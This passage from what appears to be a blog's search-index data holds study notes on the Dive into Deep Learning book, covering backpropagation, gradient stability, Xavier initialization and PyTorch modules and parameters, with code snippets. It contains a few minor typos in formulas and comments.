nn.Dropout(dropout1),</span><br><span class=\"line\">        nn.Linear(<span class=\"number\">256</span>, <span class=\"number\">256</span>),</span><br><span class=\"line\">        nn.ReLU(),</span><br><span class=\"line\">        <span class=\"comment\"># 在第二个全连接层之后添加一个dropout层</span></span><br><span class=\"line\">        nn.Dropout(dropout2),</span><br><span class=\"line\">        nn.Linear(<span class=\"number\">256</span>, <span class=\"number\">10</span>))</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"154-summary\">15.4 Summary</span></h2><p>1) Replace some terms with 0 randomly, to avoid overfitting.<br>2) The dropout probability p is a hyperparameter.</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"16_Fd_BK_Propagation","url":"/2023/03/20/D2L_016_FD_BK_Propagation/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-mCVulLUz\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"161-forward-propagation\">16.1 Forward Propagation</span></h2><p>The caculation graph as follows:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%207.25.29%20PM.png\" alt=\"Screen Shot 2023-03-20 at 7.25.29 PM\"></p>\n<p>We can consider it as a relatively common froward way to caculate the output.</p>\n<script type=\"math/tex; mode=display\">\n1)\\   \\  \\mathbf{z} = \\mathbf{w_{1}}\\mathbf{x},</script><script type=\"math/tex; mode=display\">\n2) \\ \\ \\mathbf{h} = \\sigma(\\mathbf{z})</script><script type=\"math/tex; mode=display\">\n3) \\ \\ \\mathbf{o} = \\mathbf{W_{2}}\\mathbf{h}</script><script type=\"math/tex; mode=display\">\n4)\\ \\ L = l(\\mathbf{o},\\mathbf{y})</script><script type=\"math/tex; mode=display\">\n5) \\ \\ s = \\frac{\\lambda}{2}(\\|W_{1}\\|^2_{F}+\\|W_{2}\\|^2_{F})</script><script type=\"math/tex; mode=display\">\n6) \\ \\ J = L+s</script><h2><span id=\"162-backward-propagation\">16.2 Backward Propagation</span></h2><p>According to the chain rule in caculus, traverse the network from output to input.</p>\n<p>We can derive the express steps by steps:</p>\n<script type=\"math/tex; mode=display\">\n1) \\partial \\frac{J}{\\partial L} = 1</script><script type=\"math/tex; mode=display\">\n2) \\partial \\frac{J}{\\partial \\mathbf{o}} = prod(\\partial\\frac{J}{\\partial \\mathbf{L}},\\partial\\frac{L}{\\partial \\mathbf{o}})=\\partial\\frac{L}{\\partial \\mathbf{o}}</script><script type=\"math/tex; mode=display\">\n3) \\partial \\frac{s}{\\partial \\mathbf{W^1}} = \\lambda \\mathbf{W^1} \\ \\ and \\ \\ \\partial \\frac{s}{\\partial \\mathbf{W^2}} = \\ \\lambda \\mathbf{W^2}</script><script type=\"math/tex; mode=display\">\n4) \\frac{\\partial{\\mathbf{J}}}{\\partial{\\mathbf{W^2}}} = prod \\ (\\partial\\frac{J}{\\partial \\mathbf{o}},\\partial\\frac{\\mathbf{o}}{\\partial \\mathbf{W^2}}) + prod \\ (\\partial\\frac{J}{\\partial \\mathbf{s}},\\partial\\frac{\\mathbf{s}}{\\partial \\mathbf{W^2}})  = \\partial\\frac{\\mathbf{J}}{\\partial \\mathbf{o}}\\mathbf{h}^T+\\lambda \\mathbf{W^1}</script><script type=\"math/tex; mode=display\">\n5) \\ \\frac{\\partial{\\mathbf{J}}}{\\partial{\\mathbf{h}}} = prod \\ (\\partial\\frac{J}{\\partial \\mathbf{o}},\\partial\\frac{\\mathbf{o}}{\\partial \\mathbf{h}}) = {\\mathbf{W}^2}^T\\partial\\frac{\\mathbf{J}}{\\partial \\mathbf{o}})</script><script type=\"math/tex; mode=display\">\n6) \\ \\frac{\\partial{\\mathbf{J}}}{\\partial{\\mathbf{z}}} = prod \\ (\\partial\\frac{J}{\\partial \\mathbf{h}},\\partial\\frac{\\mathbf{h}}{\\partial \\mathbf{z}}) = \\partial\\frac{\\mathbf{J}}{\\partial \\mathbf{h}})⊙ \\sigma'(\\mathbf{z})</script><script type=\"math/tex; mode=display\">\n7) \\frac{\\partial{\\mathbf{J}}}{\\partial{\\mathbf{W^1}}} = prod \\ (\\partial\\frac{J}{\\partial \\mathbf{1}},\\partial\\frac{\\mathbf{1}}{\\partial \\mathbf{W^1}}) + prod \\ (\\partial\\frac{J}{\\partial \\mathbf{s}},\\partial\\frac{\\mathbf{s}}{\\partial \\mathbf{W^1}})  = \\partial\\frac{\\mathbf{J}}{\\partial \\mathbf{z}}\\mathbf{x}^T+\\lambda \\mathbf{W^1}</script>","categories":["ML"],"tags":["d2l"]},{"title":"17_Stability","url":"/2023/03/20/D2L_017_Numerical_Stability_and_Initialization/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-IOmvdNCJ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"171-exploding-gradients\">17.1 Exploding Gradients</span></h2><h3><span id=\"1711-description\">17.1.1 Description</span></h3><p>Given a nerual network with d layers:</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{h}^t = f_{t}(\\mathbf{h^t-1})</script><p>We can apply chain rule to work out it gradient towards wt:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%209.32.57%20PM.png\" alt=\"Screen Shot 2023-03-20 at 9.32.57 PM\"></p>\n<p>And take a MLP for instance:</p>\n<script type=\"math/tex; mode=display\">\nf_{t}(\\mathbf{h}^{t-1}) = \\sigma(\\mathbf{W}^t)\\mathbf{h}^{t-1}</script><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%209.36.45%20PM.png\" alt=\"Screen Shot 2023-03-20 at 9.36.45 PM\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%209.37.09%20PM.png\" alt=\"Screen Shot 2023-03-20 at 9.37.09 PM\"></p>\n<p>And some of the final results will come from the term</p>\n<script type=\"math/tex; mode=display\">\n\\prod _{i=t}^{d-1}(W^i)^T</script><p>So if W &gt; 1 , after the (d-t) times multiply, it may become very large, and the phenomonem is called gradient exploding.</p>\n<h3><span id=\"1711-disadvantages\">17.1.1 Disadvantages</span></h3><p>1) The value will overflow (especially to the 16 bit float number)<br>2) Sensetive to the learning rate.<br>    1) Learning rate too large -&gt; big value of parameter -&gt; bigger gradient<br>    2) Learning rate too small -&gt; NO Progress in trainning</p>\n<h2><span id=\"172-vanishing-gradients\">17.2  Vanishing Gradients</span></h2><h3><span id=\"1721-description\">17.2.1 Description</span></h3><p>The idea is same as the Exploding Gradients.<br>If we use sigmoid as a activate function:</p>\n<script type=\"math/tex; mode=display\">\n\\sigma (x) = \\frac{1}{1+e^{-x}}</script><script type=\"math/tex; mode=display\">\n\\sigma '(x) = \\sigma (x)(1-\\sigma(x))</script><p>so</p>\n<script type=\"math/tex; mode=display\">\n\\prod _{i=t}^{d-1}(W^i)^T</script><p>maybe become small ,then we gain the d-t times product of  Wi. It will cause the gradient became less and less.</p>\n<h3><span id=\"1722-disadvantages\">17.2.2 Disadvantages</span></h3><p>1) The gradient become 0.<br>2) NO progress for training<br>3) Hard to train the relative deep network(Because the deeper network have a smaller gradient )</p>\n<h2><span id=\"173-initialize-of-model-and-parameter\">17.3 Initialize of Model and parameter</span></h2><h3><span id=\"1731-improve-stability\">17.3.1 Improve stability</span></h3><p>Key idea :<br>1) Consider output and gradient of each layer as a random variable.<br>2) The Mean and Variance  keep same for each layer.(E[x] = 0 ,D[x] = a)</p>\n<h4><span id=\"eg-mlp\">e.g MLP</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%209.53.41%20PM.png\" alt=\"Screen Shot 2023-03-20 at 9.53.41 PM\"></p>\n<p>I.i.d Independent and identically distributed.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%209.55.41%20PM.png\" alt=\"Screen Shot 2023-03-20 at 9.55.41 PM\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%209.56.03%20PM.png\" alt=\"Screen Shot 2023-03-20 at 9.56.03 PM\"><br>To let Variance (ht) = Variance (ht-1) , the parameter before the Var should be 1.</p>\n<h3><span id=\"1732-xavier-initialization\">17.3.2 Xavier Initialization</span></h3><h4><span id=\"why\">why?</span></h4><p>It is hard to satisfy both the condition:</p>\n<script type=\"math/tex; mode=display\">\nn_{t-1} \\gamma _{t} = 1 \\ \\ and \\ \\ n_{t} \\gamma _{t} = 1</script><h4><span id=\"how\">how?</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%2010.00.41%20PM.png\" alt=\"Screen Shot 2023-03-20 at 10.00.41 PM\"></p>\n<h2><span id=\"174-with-activate-function\">17.4 With activate function</span></h2><p>Assume we use a linear activate function:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%2010.02.40%20PM.png\" alt=\"Screen Shot 2023-03-20 at 10.02.40 PM\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%2010.03.39%20PM.png\" alt=\"Screen Shot 2023-03-20 at 10.03.39 PM\"></p>\n<h2><span id=\"175-review-for-common-activate-function\">17.5 Review for Common Activate Function</span></h2><p>Only the sigmoid has no “x” term near the zero point, so we can adjust it.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%2010.03.55%20PM.png\" alt=\"Screen Shot 2023-03-20 at 10.03.55 PM\"></p>\n","categories":["ML"],"tags":["d2l"]},{"title":"18_DNN","url":"/2023/03/21/D2L_018_DNN_overview/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-uaROjGEq\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>From this module we begin to explore how to achive a nerwork by using Pytorch, leaning some basic ideas in implement deep nerual network in pytorch.</p>\n<h1><span id=\"181-modules\">18.1 Modules</span></h1><p>It turns out that it’s more valuable to use modules which are bigger than the individual layer  model but smaller than a entire model. We call them “groups of layers”.<br>To achive some complicated  neural networks, we introduce the concept of a neural network <strong>module</strong>.<br>A module could describe a single layer, a component consisting of multiple layers, or the entire model itself. And with the help of moduls, we can  combine them  into larger artifacts, thus writing surprisingly compact code and still implement complex neural networks.</p>\n<h2><span id=\"1811-review-of-mlp\">18.1.1 Review of MLP</span></h2><p>From a programming standpoint, a module is represented by a <strong>class</strong>.<br>And before we undetaking the code, we might as well inspect the code of MLP.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.nn <span class=\"keyword\">import</span> functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"></span><br><span class=\"line\">net = nn.Sequential(nn.Linear(<span class=\"number\">20</span>, <span class=\"number\">256</span>), nn.ReLU(), nn.Linear(<span class=\"number\">256</span>, <span class=\"number\">10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">X = torch.rand(<span class=\"number\">2</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">net(X)</span><br></pre></td></tr></table></figure>\n<p>So the code defined the network is quit simple<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">net = nn.Sequential(nn.Linear(<span class=\"number\">20</span>, <span class=\"number\">256</span>), nn.ReLU(), nn.Linear(<span class=\"number\">256</span>, <span class=\"number\">10</span>))</span><br></pre></td></tr></table></figure></p>\n<p>We construct our model through the function <code>Sequential</code>. And pile the layers we need on the <code>sequential</code>.<br><code>sequential</code> define a special  kind of module. It maintains an ordered list of constituent <code>Module</code>.</p>\n<h2><span id=\"1812-customized-modules\">18.1.2 Customized Modules</span></h2><p>Perhaps the easiest way to develop intuition about how a module works is to implement one ourselves.</p>\n<h3><span id=\"18121-mlp\">18.1.2.1 MLP</span></h3><p>In the following snippet, we code a MLP with one hidden layer with 256 hidden units, and a 10-dimensional output layer.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MLP</span>(<span class=\"params\">nn.Module</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># Call the constructor of the parent class nn.Module to perform</span></span><br><span class=\"line\">        <span class=\"comment\"># the necessary initialization</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        self.hidden = nn.LazyLinear(<span class=\"number\">256</span>) <span class=\"comment\"># 256 hidden units</span></span><br><span class=\"line\">        self.out = nn.LazyLinear(<span class=\"number\">10</span>) <span class=\"comment\"># 10 output units</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Define the forward propagation of the model, that is, how to return the</span></span><br><span class=\"line\">    <span class=\"comment\"># required model output based on the input X</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span>(<span class=\"params\">self, X</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.out(F.relu(self.hidden(X)))</span><br></pre></td></tr></table></figure></p>\n<h3><span id=\"18122-sequential\">18.1.2.2 Sequential</span></h3><p>Pytorch will aware of that all of the block we add into the squential are essential for caculate,<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MySequential</span>(<span class=\"params\">nn.Module</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, *args</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__() <span class=\"comment\">#initailize parameters</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> block <span class=\"keyword\">in</span> args:</span><br><span class=\"line\">            self._modules[block] = block </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span>(<span class=\"params\">self, X</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> block <span class=\"keyword\">in</span> self._modules.values():</span><br><span class=\"line\">            X = block(X) </span><br><span class=\"line\">        <span class=\"keyword\">return</span> X</span><br></pre></td></tr></table></figure></p>\n<p>We can also achive it using some flexiable way, and the following code shows that we can assemb any code into a neural network.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FixedHiddenMLP</span>(<span class=\"params\">nn.Module</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        <span class=\"comment\"># 不计算梯度的随机权重参数。因此其在训练期间保持不变</span></span><br><span class=\"line\">        self.rand_weight = torch.rand((<span class=\"number\">20</span>, <span class=\"number\">20</span>), requires_grad=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        self.linear = nn.Linear(<span class=\"number\">20</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span>(<span class=\"params\">self, X</span>):</span></span><br><span class=\"line\">        X = self.linear(X)</span><br><span class=\"line\">        <span class=\"comment\"># 使用创建的常量参数以及relu和mm函数</span></span><br><span class=\"line\">        X = F.relu(torch.mm(X, self.rand_weight) + <span class=\"number\">4</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 复用全连接层。这相当于两个全连接层共享参数</span></span><br><span class=\"line\">        X = self.linear(X)</span><br><span class=\"line\">        <span class=\"comment\"># 控制流</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> X.<span class=\"built_in\">abs</span>().<span class=\"built_in\">sum</span>() &gt; <span class=\"number\">1</span>: </span><br><span class=\"line\">            X /= <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> X.<span class=\"built_in\">sum</span>()</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"1813-summary\">18.1.3 Summary</span></h2><p>1) A module can constitute with layers or mudules.<br>2)  Module do the inner part of works including backward or parameter initialization.<br>3) The connection of mudules is charged by sequential.</p>\n<p>But the random combination of modules and codes will cause a waste of efficiency, which leaves us a problem waiting for addressing.</p>\n<h1><span id=\"182-parameter-management\">18.2 Parameter Management</span></h1><h2><span id=\"1821-parameter-access\">18.2.1 parameter access</span></h2><p>For a simple primary MLP:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"></span><br><span class=\"line\">net = nn.Sequential(nn.Linear(<span class=\"number\">4</span>, <span class=\"number\">8</span>), nn.ReLU(), nn.Linear(<span class=\"number\">8</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">X = torch.rand(size=(<span class=\"number\">2</span>, <span class=\"number\">4</span>))</span><br><span class=\"line\">net(X)</span><br></pre></td></tr></table></figure></p>\n<p>We can access its parameter from the function<code>state_dict()</code>(float32)<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(net[<span class=\"number\">2</span>].state_dict())</span><br><span class=\"line\"><span class=\"comment\"># OrderedDict([(&#x27;weight&#x27;, tensor([[ 0.2579, -0.1493,  0.2151, -0.1589, -0.1218, -0.0021, </span></span><br><span class=\"line\"><span class=\"comment\"># 0.0325,  0.1821]])), (&#x27;bias&#x27;, tensor([-0.0143]))])</span></span><br></pre></td></tr></table></figure><br>Certainly, we can directly access to the concrete parameter.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">type</span>(net[<span class=\"number\">2</span>].bias))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(net[<span class=\"number\">2</span>].bias)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(net[<span class=\"number\">2</span>].bias.data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&lt;class &#x27;torch.nn.parameter.Parameter&#x27;&gt; # Optimizable parameter</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Parameter containing:</span></span><br><span class=\"line\"><span class=\"string\">tensor([-0.0143], requires_grad=True)</span></span><br><span class=\"line\"><span class=\"string\">tensor([-0.0143])</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><br>We can even access to the gradient of each parameter:<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-21%20at%203.16.12%20PM.png\" alt=\"Screen Shot 2023-03-21 at 3.16.12 PM\"></p>\n<p>Since we have not yet use the backforward to caculate gradient, so it is none.</p>\n<p>Get all of the parameter via the function <code>named_parameters()</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(*[(name, param.shape) <span class=\"keyword\">for</span> name, param <span class=\"keyword\">in</span> net[<span class=\"number\">0</span>].named_parameters()])</span><br><span class=\"line\"><span class=\"comment\"># take out the first network layer &#x27;s parameter </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(*[(name, param.shape) <span class=\"keyword\">for</span> name, param <span class=\"keyword\">in</span> net.named_parameters()])</span><br><span class=\"line\"><span class=\"comment\"># take out the all network layers &#x27;s parameter </span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"string\">&#x27;weight&#x27;</span>, torch.Size([<span class=\"number\">8</span>, <span class=\"number\">4</span>])) (<span class=\"string\">&#x27;bias&#x27;</span>, torch.Size([<span class=\"number\">8</span>]))</span><br><span class=\"line\"><span class=\"comment\"># The second layer ReLU has no parameter. So the label &quot;1&quot; is skipped.</span></span><br><span class=\"line\">(<span class=\"string\">&#x27;0.weight&#x27;</span>, torch.Size([<span class=\"number\">8</span>, <span class=\"number\">4</span>])) (<span class=\"string\">&#x27;0.bias&#x27;</span>, torch.Size([<span class=\"number\">8</span>])) (<span class=\"string\">&#x27;2.weight&#x27;</span>, torch.Size([<span class=\"number\">1</span>, <span class=\"number\">8</span>])) (<span class=\"string\">&#x27;2.bias&#x27;</span>, torch.Size([<span class=\"number\">1</span>]))</span><br></pre></td></tr></table></figure>\n<p>Or we can use the name of parameter to get the data:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">net.state_dict()[<span class=\"string\">&#x27;2.bias&#x27;</span>].data</span><br><span class=\"line\"><span class=\"comment\"># tensor([-0.0143])</span></span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"1822-access-parameter-from-nesting-module\">18.2.2 Access parameter from nesting module</span></h2><p>when we apply a nest module to the network, it looks like that :<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">block1</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> nn.Sequential(nn.Linear(<span class=\"number\">4</span>, <span class=\"number\">8</span>), nn.ReLU(),</span><br><span class=\"line\">                         nn.Linear(<span class=\"number\">8</span>, <span class=\"number\">4</span>), nn.ReLU())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">block2</span>():</span></span><br><span class=\"line\">    net = nn.Sequential()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">        <span class=\"comment\"># call nest block1 </span></span><br><span class=\"line\">        net.add_module(<span class=\"string\">f&#x27;block <span class=\"subst\">&#123;i&#125;</span>&#x27;</span>, block1())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> net</span><br><span class=\"line\"></span><br><span class=\"line\">rgnet = nn.Sequential(block2(), nn.Linear(<span class=\"number\">4</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">rgnet(X)</span><br></pre></td></tr></table></figure></p>\n<p>One of the benefits we use <code>add_module</code>is that it allows ue to customize the label ‘s name with “block{i}”, instead of a naked ordered number.</p>\n<p>Then we print the entire network out:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sequential(</span><br><span class=\"line\">  (0): Sequential(</span><br><span class=\"line\">    (block 0): Sequential(</span><br><span class=\"line\">      (0): Linear(in_features=4, out_features=8, bias=True)</span><br><span class=\"line\">      (1): ReLU()</span><br><span class=\"line\">      (2): Linear(in_features=8, out_features=4, bias=True)</span><br><span class=\"line\">      (3): ReLU()</span><br><span class=\"line\">    )</span><br><span class=\"line\">    (block 1): Sequential(</span><br><span class=\"line\">      (0): Linear(in_features=4, out_features=8, bias=True)</span><br><span class=\"line\">      (1): ReLU()</span><br><span class=\"line\">      (2): Linear(in_features=8, out_features=4, bias=True)</span><br><span class=\"line\">      (3): ReLU()</span><br><span class=\"line\">    )</span><br><span class=\"line\">    (block 2): Sequential(</span><br><span class=\"line\">      (0): Linear(in_features=4, out_features=8, bias=True)</span><br><span class=\"line\">      (1): ReLU()</span><br><span class=\"line\">      (2): Linear(in_features=8, out_features=4, bias=True)</span><br><span class=\"line\">      (3): ReLU()</span><br><span class=\"line\">    )</span><br><span class=\"line\">    (block 3): Sequential(</span><br><span class=\"line\">      (0): Linear(in_features=4, out_features=8, bias=True)</span><br><span class=\"line\">      (1): ReLU()</span><br><span class=\"line\">      (2): Linear(in_features=8, out_features=4, bias=True)</span><br><span class=\"line\">      (3): ReLU()</span><br><span class=\"line\">    )</span><br><span class=\"line\">  )</span><br><span class=\"line\">  (1): Linear(in_features=4, out_features=1, bias=True)</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure><br>As we can see, it’s indeed label each module with a text name .<br>Actually it’s three layer of sequential nest, and we can access the parameter of it’s inner mudule by<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">rgnet[<span class=\"number\">0</span>][<span class=\"number\">1</span>][<span class=\"number\">0</span>].bias</span><br></pre></td></tr></table></figure></p>\n<p>It’s index require the access of block 1 ‘s first linear layer .</p>\n<h2><span id=\"1823-parameter-initialization\">18.2.3 Parameter Initialization</span></h2><p>After learning how to access to the parameters ,let us learn how to modify the default parameter configurations or just initialize a series of parameters.</p>\n<h3><span id=\"18231-default-setting\">18.2.3.1 Default Setting</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_normal</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        nn.init.normal_(m.weight, mean=<span class=\"number\">0</span>, std=<span class=\"number\">0.01</span>)</span><br><span class=\"line\">        nn.init.zeros_(m.bias)</span><br><span class=\"line\">net.apply(init_normal)</span><br><span class=\"line\">net[<span class=\"number\">0</span>].weight.data[<span class=\"number\">0</span>], net[<span class=\"number\">0</span>].bias.data[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n<h3><span id=\"18232-customer-setting\">18.2.3.2 Customer Setting</span></h3><p>The code initialize the parameters with a std normal distributed weight and zero bias.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_constant</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        nn.init.constant_(m.weight, <span class=\"number\">1</span>)</span><br><span class=\"line\">        nn.init.zeros_(m.bias)</span><br><span class=\"line\">net.apply(init_constant)</span><br><span class=\"line\"><span class=\"comment\"># for all modules in the net, call the init function with a parameter of module itself.</span></span><br><span class=\"line\">net[<span class=\"number\">0</span>].weight.data[<span class=\"number\">0</span>], net[<span class=\"number\">0</span>].bias.data[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure><br>So just initialize all of the parameters with 0.</p>\n<p>More advanced method can be applied to initialize the parameters, like <code>Xavier</code> initialization.Also, for any layers we can call the init function to change the parameters.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_xavier</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        nn.init.xavier_uniform_(m.weight)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_42</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        nn.init.constant_(m.weight, <span class=\"number\">42</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">net[<span class=\"number\">0</span>].apply(init_xavier)</span><br><span class=\"line\">net[<span class=\"number\">2</span>].apply(init_42)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(net[<span 